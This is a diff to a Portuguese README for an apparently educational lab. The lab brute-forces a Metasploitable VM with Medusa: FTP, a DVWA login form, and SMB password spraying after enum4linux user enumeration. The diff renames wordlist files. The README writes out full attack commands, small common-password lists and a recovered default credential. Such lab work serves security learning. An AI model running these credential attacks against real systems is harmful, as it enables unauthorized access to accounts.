@@ -78,15 +78,15 @@ cat opensPort.txt
 Wordlists simples, criadas apenas para fins didáticos:
 
 ```bash
-echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
-cat users.txt
+echo -e "user\nmsfadmin\nadmin\nroot" > usersFTP.txt
+cat usersFTP.txt
 ```
 
 ![Criação da wordlist de usuários](images/wordlist-users.png)
 
 ```bash
-echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
-cat pass.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > passFTP.txt
+cat passFTP.txt
 ```
 
 ![Criação da wordlist de senhas](images/wordlist-passwords.png)
@@ -94,7 +94,7 @@ cat pass.txt
 Ataque com Medusa:
 
 ```bash
-medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
+medusa -h 192.168.56.103 -U usersFTP.txt -P passFTP.txt -M ftp -t 6
 ```
 
 | Flag | Significado |
@@ -129,7 +129,7 @@ Password: ********
 DVWA acessado em `http://192.168.56.103/dvwa`, nível de segurança em **low** (DVWA Security > Security Level), para fins de demonstração do ataque. Os campos do formulário de login foram inspecionados antes do ataque para identificar os parâmetros `username`, `password` e `Login`.
 
 ```bash
-medusa -h 192.168.56.103 -U usersForm.txt -P pass.txt -M http \
+medusa -h 192.168.56.103 -U usersForm.txt -P passForms.txt -M http \
   -m PAGE:'/dvwa/login.php' \
   -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
   -m 'FAIL=Login failed' -t 6
@@ -153,8 +153,8 @@ Enumeração de usuários do sistema via `enum4linux`, filtrando e extraindo ape
 
 ```bash
 enum4linux -a 192.168.56.103 | grep user | tee enum4_users.txt
-grep -oP '(?<=user:\[)[^\]]+' enum4_users.txt > wordList.txt
-cat wordList.txt
+grep -oP '(?<=user:\[)[^\]]+' enum4_users.txt > smb_users.txt
+cat smb_users.txt
 ```
 
 ![Enumeração de usuários SMB e wordlist extraída](images/smb-enum4linux-wordlist.png)
@@ -164,7 +164,7 @@ cat wordList.txt
 Password spraying: lista de usuários extraída contra um pequeno conjunto de senhas comuns, via módulo `smbnt`:
 
 ```bash
-medusa -h 192.168.56.103 -U wordList.txt -P smb_pass.txt -M smbnt
+medusa -h 192.168.56.103 -U smb_users.txt -P passSMB.txt -M smbnt
 ```
 
 **Resultado:**
@@ -199,9 +199,12 @@ ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [S
 .
 ├── README.md
 ├── wordlists/
-│   ├── users.txt
-│   ├── pass.txt
-│   └── wordList.txt
+│   ├── usersFTP.txt
+│   ├── passFTP.txt
+│   ├── usersForm.txt
+│   ├── passForms.txt
+│   ├── smb_users.txt
+│   └── passSMB.txt
 └── images/
     ├── ping-kali-to-meta.png
     ├── ifconfig-metasploitable.png
